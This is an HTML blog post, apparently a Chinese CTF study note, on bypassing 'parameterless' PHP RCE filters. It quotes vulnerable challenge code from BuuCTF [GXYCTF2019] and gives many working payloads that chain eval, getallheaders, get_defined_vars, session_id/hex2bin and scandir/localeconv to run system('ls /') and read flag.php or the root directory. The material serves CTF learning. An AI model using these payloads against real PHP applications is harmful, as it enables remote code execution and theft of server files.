@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Zbaoabo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="无参数RCE绕过思路[TOC] 无参数RCE绕过思路 - yankun PHP无参数函数安全漏洞利用详解-CSDN博客 方法1：getenv()查阅php手册，有非常多的超全局变量 123456789$GLOBALS$_SERVER$_GET$_POST$_FILES$_COOKIE$_SESSION$_REQUEST$_ENV  我们可以使用$_ENV，对应函数为getenv() 虽然geten">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zbaoabo">
+<meta property="og:url" content="http://example.com/2025/04/23/%E6%97%A0%E5%8F%82%E6%95%B0RCE%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/index.html">
+<meta property="og:site_name" content="Zbaoabo">
+<meta property="og:description" content="无参数RCE绕过思路[TOC] 无参数RCE绕过思路 - yankun PHP无参数函数安全漏洞利用详解-CSDN博客 方法1：getenv()查阅php手册，有非常多的超全局变量 123456789$GLOBALS$_SERVER$_GET$_POST$_FILES$_COOKIE$_SESSION$_REQUEST$_ENV  我们可以使用$_ENV，对应函数为getenv() 虽然geten">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-04-23T12:35:23.076Z">
+<meta property="article:modified_time" content="2025-04-26T00:56:43.895Z">
+<meta property="article:author" content="zhangsuhong">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">zhangsuhong</a></h1>
+		</hgroup>
+
+		
+			<p class="header-subtitle"></p>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-无参数RCE绕过思路" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/23/%E6%97%A0%E5%8F%82%E6%95%B0RCE%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/" class="article-date">
+  	<time datetime="2025-04-23T12:35:23.076Z" itemprop="datePublished">2025-04-23</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="无参数RCE绕过思路"><a href="#无参数RCE绕过思路" class="headerlink" title="无参数RCE绕过思路"></a>无参数RCE绕过思路</h1><p>[TOC]</p>
+<p><a target="_blank" rel="noopener" href="https://yankun8.github.io/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/">无参数RCE绕过思路 - yankun</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45785288/article/details/109259595">PHP无参数函数安全漏洞利用详解-CSDN博客</a></p>
+<h3 id="方法1：getenv"><a href="#方法1：getenv" class="headerlink" title="方法1：getenv()"></a>方法1：getenv()</h3><p>查阅php手册，有非常多的超全局变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS</span><br><span class="line">$_SERVER</span><br><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br><span class="line">$_REQUEST</span><br><span class="line">$_ENV</span><br></pre></td></tr></table></figure>
+
+<p>我们可以使用<code>$_ENV</code>，对应函数为<code>getenv()</code></p>
+<p>虽然<code>getenv()</code>可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题<br>这里可以使用方法：</p>
+<h4 id="array-rand"><a href="#array-rand" class="headerlink" title="array_rand()"></a>array_rand()</h4><p>array_rand() 方法用于从一个数组中随机( 伪随机 )取出一个或者多个单元 ， 并返回随机条目的一个或者多个<strong>键</strong></p>
+<p>但这样只能获得数组的<strong>键</strong> ， 可以通过 array_flip() 函数获取数组的<strong>值</strong></p>
+<h4 id="array-flip"><a href="#array-flip" class="headerlink" title="array_flip()"></a>array_flip()</h4><p>该函数用于交换数组中的值和键 ， 返回一个 <strong>键</strong> 与 <strong>值</strong> 相互交换后的数组</p>
+<p><code>getenv()</code> , <code>array_rand()</code> , <code>array_flip()</code> 加上全局变量<code>$_ENV</code> 这三个函数配套使用 ， 可以爆破出数组中需要的内容 .</p>
+<h3 id="方法2：getallheaders"><a href="#方法2：getallheaders" class="headerlink" title="方法2：getallheaders()"></a>方法2：getallheaders()</h3><h4 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a><strong>getallheaders()</strong></h4><h4 id="end"><a href="#end" class="headerlink" title="end()"></a>end()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(end(getallheaders()))        //获取http请求头中最后一个参数的值，并执行</span><br></pre></td></tr></table></figure>
+
+<p>getallheders用法小结<br>添加一个Header为c: phpinfo();,根据位置选择合适的payload：</p>
+<p>添加在Header在第一个：</p>
+<p>payload: code&#x3D;eval(pos(getallheaders()));</p>
+<p>(pos()可以换为current(). 如果在第二个可以使用next())</p>
+<p>添加在Header在最后一个：</p>
+<p>payload: code&#x3D;eval(end(getallheaders()));</p>
+<p>不知道位置：</p>
+<p>配合array_rand(), array_flip()构造payload进行爆破：</p>
+<p>payload: eval(array_rand(array_flip(getallheaders())));</p>
+<h3 id="方法3：localeconv"><a href="#方法3：localeconv" class="headerlink" title="方法3：localeconv()"></a>方法3：localeconv()</h3><h4 id="scandir-："><a href="#scandir-：" class="headerlink" title="scandir()："></a><code>scandir()</code>：</h4><p><code>scandir(&#39;.&#39;)</code>能够返回当前目录的文件列表的数组，那么怎么取出文件名和读取文件呢，可以使用<code>end()</code>和<code>readfile()</code>：</p>
+<p>但是还需要构造函数<code>scandir(&#39;.&#39;)</code>中的参数<code>.</code>，这里有一个<code>localeconv()</code>函数：</p>
+<p>其中数组的第一个元素就是<code>.</code>， 所以用 pos 或者 current</p>
+<p>但是我们不知道 flag.php的位置所以我们还需要利用我们最开始讲的两个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="方法4：get-defined-vars"><a href="#方法4：get-defined-vars" class="headerlink" title="方法4：get_defined_vars()"></a>方法4：get_defined_vars()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars() 函数返回由所有已定义变量所组成的数组。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>和getallheaders()利用类似，但是不止apache, ngnix和其他的也可以用</p>
+<h5 id="利用-GET"><a href="#利用-GET" class="headerlink" title="利用$_GET"></a>利用<code>$_GET</code></h5><p>url：<a target="_blank" rel="noopener" href="http://127.0.0.1/ctf/boringcode/rce.php?test=phpinfo()">http://127.0.0.1/ctf/boringcode/rce.php?test=phpinfo()</a>;</p>
+<p>post：<code>code=eval(end(current(get_defined_vars())));</code></p>
+<h3 id="方法5：直接遍历目录"><a href="#方法5：直接遍历目录" class="headerlink" title="方法5：直接遍历目录"></a>方法5：直接遍历目录</h3><p>可以尝试直接读取本地文件 , 其中最大的问题就是如何切换目录来遍历目录 .</p>
+<p><strong>getcwd() : 获取当前工作目录</strong></p>
+<p><strong>scandir() : 查看当前目录下的内容</strong></p>
+<p> <strong>dirname() : 跳转上级目录</strong> </p>
+<p><strong>readfile() : 读取文件</strong></p>
+<h3 id="常用playpoad"><a href="#常用playpoad" class="headerlink" title="常用playpoad"></a>常用playpoad</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读文件：</span><br><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="最后：所有利用到的函数总结"><a href="#最后：所有利用到的函数总结" class="headerlink" title="最后：所有利用到的函数总结"></a>最后：所有利用到的函数总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getcwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir() 函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">readfile()  输出一个文件 </span><br><span class="line"></span><br><span class="line">current()       返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()           current() 的别名</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()       将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</span><br></pre></td></tr></table></figure>
+
+<p>other: <strong>array_flip可以替换为array_reverse</strong></p>
+<p> <strong>readfile可以替换为show_source 和 highlight_flie</strong></p>
+<p>介绍以下相关payload需要的函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）</span><br><span class="line">localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）</span><br><span class="line">current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西</span><br><span class="line">getcwd() :取得当前工作目录</span><br><span class="line">dirname():函数返回路径中的目录部分</span><br><span class="line">array_flip() :交换数组中的键和值，成功时返回交换后的数组</span><br><span class="line">array_rand() :从数组中随机取出一个或多个单元</span><br><span class="line">array_reverse():将数组内容反转</span><br><span class="line">strrev():用于反转给定字符串</span><br><span class="line">getcwd()：获取当前工作目录路径</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line">eval()、assert()：命令执行</span><br><span class="line">hightlight_file()、show_source()、readfile()：读取文件内容</span><br></pre></td></tr></table></figure>
+
+<p>举一个例子关于scandir()函数的使用：</p>
+<p>scandir(‘.’)是返回当前目录，就可以靠localeconv() 返回的数组第一个就是‘.’，current()取第一个值，那么current(localeconv())就能构造一个‘.’,那么以下就是一个简单的返回查看当前目录下文件的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?参数=var_dump(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+
+<p>数组移动操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">end() ： 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line">next() ：将内部指针指向数组中的下一个元素，并输出</span><br><span class="line">prev() ：将内部指针指向数组中的上一个元素，并输出</span><br><span class="line">reset() ： 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line">each() ： 返回当前元素的键名和键值，并将内部指针向前移动</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法一：scandir-最常规的通解"><a href="#方法一：scandir-最常规的通解" class="headerlink" title="方法一：scandir() 最常规的通解"></a>方法一：scandir() 最常规的通解</h3><p>一道例题BuuCTF [GXYCTF2019]禁止套娃</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最终的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>接下来逐个分析payload的构成：</p>
+<p>1、var_dump(localeconv());可以看见第一个string[1]就是一个“.”，这个点是由localeconv()产生的</p>
+<p>2、利用<code>current()</code>函数将这个点取出来的，<code>‘.’</code>代表的是当前目录，那接下来就很好理解了，我们可以利用这个点完成遍历目录的操作，相当于就是<code>linux</code>中的<code>ls</code>指令</p>
+<p>3、既然current()取第一个值，那么current(localeconv())构造一个<code>&#39;.&#39;</code>,<strong>而</strong><code>&#39;.&#39;</code> <strong>表示当前目录</strong>，<code>scandir(&#39;.&#39;)</code> 将返回当前目录中的文件和子目录，这里我们得知flag所在的文件名就是flag.php</p>
+<p>4、然而flag的文件名在比较后端我们可以通过array_reverse()将数组内容反转，让它从倒数第二的位置变成正数第二</p>
+<p>5、移动指针读取第二个数组，参照下列数组移动操作可知我们应选用next()函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">end() ： 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line">next() ：将内部指针指向数组中的下一个元素，并输出</span><br><span class="line">prev() ：将内部指针指向数组中的上一个元素，并输出</span><br><span class="line">reset() ： 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line">each() ： 返回当前元素的键名和键值，并将内部指针向前移动</span><br></pre></td></tr></table></figure>
+
+<p>6、最后用highlight_file()返回文件内容</p>
+<p>使用最多最灵活的一个函数,可以构造出不同用法，这里直接引用了别人的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件</span><br><span class="line">print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span><br><span class="line">  //查看和读取根目录文件</span><br><span class="line">  //查看和读取根目录文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法二：session-id"><a href="#方法二：session-id" class="headerlink" title="方法二：session_id()"></a>方法二：session_id()</h3><p>使用条件：当请求头中有cookie时（或者走投无路手动添加cookie头也行，有些CTF题不会卡）</p>
+<p>首先我们需要开启session_start()来保证session_id()的使用，session_id可以用来获取当前会话ID，也就是说它可以抓取PHPSESSID后面的东西，但是phpsession不允许()出现</p>
+<h4 id="法一：hex2bin（）"><a href="#法一：hex2bin（）" class="headerlink" title="法一：hex2bin（）"></a>法一：hex2bin（）</h4><p>我们自己手动对命令进行十六进制编码，后面在用函数hex2bin()解码转回去，使得后端实际接收到的是恶意代码。我们把想要执行的命令进行十六进制编码后，替换掉‘Cookie:PHPSESSID&#x3D;’后面的值</p>
+<p>以下是十六进制编码脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$encoded = bin2hex(&quot;phpinfo();&quot;);</span><br><span class="line">echo $encoded;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到phpinfo();的十六进制编码，即706870696e666f28293b</p>
+<p>那么payload就可以是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?参数=eval(hex2bin(session_id(session_start())));</span><br></pre></td></tr></table></figure>
+
+<h4 id="法二：读文件"><a href="#法二：读文件" class="headerlink" title="法二：读文件"></a>法二：读文件</h4><p>例题依然是[GXYCTF2019]禁止套娃，在知道文件名为flag.php的情况下直接读文件</p>
+<p>如果已知文件名，把文件名写在PHPSESSID后面，构造payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(session_id(session_start()));</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法三：getallheaders"><a href="#方法三：getallheaders" class="headerlink" title="方法三：getallheaders()"></a>方法三：getallheaders()</h3><p>getallheaders()返回当前请求的所有请求头信息，局限于Apache（apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache）</p>
+<p>当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法四：get-defined-vars"><a href="#方法四：get-defined-vars" class="headerlink" title="方法四：get_defined_vars()"></a>方法四：get_defined_vars()</h3><p>相较于getallheaders（）更加具有普遍性，它可以回显全局变量$_GET、$_POST、$_FILES、$_COOKIE，</p>
+<p>返回数组顺序为$_GET–&gt;$_POST–&gt;$_COOKIE–&gt;$_FILES</p>
+<p>首先确认是否有回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(get_defined_vars());</span><br></pre></td></tr></table></figure>
+
+<p>假如说原本只有一个参数a，那么可以多加一个参数b，后面写入恶意语句，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>把eval换成assert也行 ，能执行system(‘ls &#x2F;‘)就行</p>
+<h3 id="方法五：chdir-array-rand-赌狗读文"><a href="#方法五：chdir-array-rand-赌狗读文" class="headerlink" title="方法五：chdir()&amp;array_rand()赌狗读文"></a>方法五：chdir()&amp;array_rand()赌狗读文</h3><p>实在无法rce，可以考虑目录遍历进行文件读取</p>
+<p>利用<code>getcwd()</code>获取当前目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(getcwd());</span><br></pre></td></tr></table></figure>
+
+<p>结合dirname()列出当前工作目录的父目录中的所有文件和目录:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(dirname(getcwd())));</span><br></pre></td></tr></table></figure>
+
+<p>读上一级文件名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br><span class="line"></span><br><span class="line">?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line"></span><br><span class="line">?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br></pre></td></tr></table></figure>
+
+<p>读根目录:</p>
+<p>ord() 函数和 chr() 函数：只能对第一个字符进行转码，ord() 编码，chr)解码，有概率会解码出斜杠读取根目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</span><br></pre></td></tr></table></figure>
+
+<p>要用chdir()固定，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array() )))))))))));</span><br></pre></td></tr></table></figure>
+
+<p>通过bp的intruder模块来读到根目录：</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/04/25/sqlmap/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/04/22/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 zhangsuhong
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
